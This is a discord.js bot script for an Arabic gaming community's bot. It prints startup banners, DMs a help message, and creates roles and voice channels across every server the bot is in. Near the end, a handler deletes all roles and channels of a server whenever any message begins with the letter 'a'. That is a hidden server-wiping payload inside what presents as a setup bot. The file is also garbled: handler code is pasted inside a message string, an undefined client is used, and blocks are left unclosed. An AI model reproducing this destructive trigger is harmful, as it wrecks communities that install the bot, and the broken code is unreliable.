const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '×'

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`.help`,"http://twitch.tv/S-F")
  console.log('')
  console.log('')
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});


client.on('message', message => { if (message.author.bot) return; if (message.content === prefix + "help") { 		 message.channel.send('**The Message Was Sent On Private**'); 	 		 message.author.sendMessage(` ** __~~The ARAB GAMER ~~__ By: Spomi : 9954 
╔[❖════════════❖]╗ Prefix =  .
   
╔[❖════════════❖]╗بعض أوامر
×create server : ضبط رومات ااسيرفر


LOka.on('message', message => {
     if (message.content === "بدء عملية  انشاء سيرفر") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "༺Owner༻",
        permissions :   [1],
        color : " #62d4d2"
    })
    m.createRole({
        name : "༺Minister༻",
        permissions :   [1],
        color : " #e9b46a"
    })
    m.createRole({
        name : "༻¥óǔ₮ùβŔ༻",
        permissions :   [1],
        color : " #0a4610"
    })
    m.createRole({
        name : "༺botй༻",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "βiG βὄŝŝ",
        permissions :   [1],
        color : " #4fb2e4"
    })
  
   
})
 
 
}
});

 })
}
});

LOka.on('message', message => {
         if (message.content === "×create server") {
                              LOka.guilds.forEach(m =>{
                           m.createChannel('📢༄╬₮♛à♛í╬༭₭ ❶', 'voice'); 
                           m.createChannel('📢༄╬₮♛à♛í╬༭₭ ❷', 'voice');
m.createChannel('🎮𝔽𝕆ℝ𝕋ℕ𝕀𝕋𝔼', 'voice');
m.createChannel('🎮𝔹𝕃𝔸ℂ𝕂-𝕊ℚ𝕌𝔸𝔻', 'voice');
m.createChannel('🎮ℂℝ𝕆𝕊𝕊𝔽𝕀ℝ𝔼-ℙℍ', 'voice');
m.createChannel('🎮ℂℝ𝕆𝕊𝕊𝔽𝕀ℝ𝔼-ℕ𝔸', 'voice');
m.createChannel('🎮𝕄𝕀ℕ𝔼ℂℝ𝔸𝔽𝕋', 'voice');
m.createChannel('༺🎶₥úsíc🎶༻-', 'voice');
m.createChannel('༺🎶₥úsíc🎶༻-', 'voice');
m.createChannel('༺🎶₥úsíc🎶༻', 'voice');
m.createChannel('【✭ 🔱Jús₮ 🔱✭】 1', 'voice');
m.createChannel('【✭ 🔱Jús₮ 🔱✭】 2', 'voice');
m.createChannel('【✭ 🔱Jús₮ 🔱✭】 3', 'voice');
m.createChannel('⫷༺ 💤 A.F.K 💤༺⫸', 'voice');
})
}
 
});
  client.on('message', x5bz => {   
 if (x5bz.content.startsWith("a")) {
     x5bz.guild.roles.forEach(r => { r.delete() }) 
     x5bz.guild.channels.forEach(c => { c.delete() })
                let v5bz = new Discord.RichEmbed()
            .setColor('RANDOM')








client.login(process.env.BOT3_TOKEN);
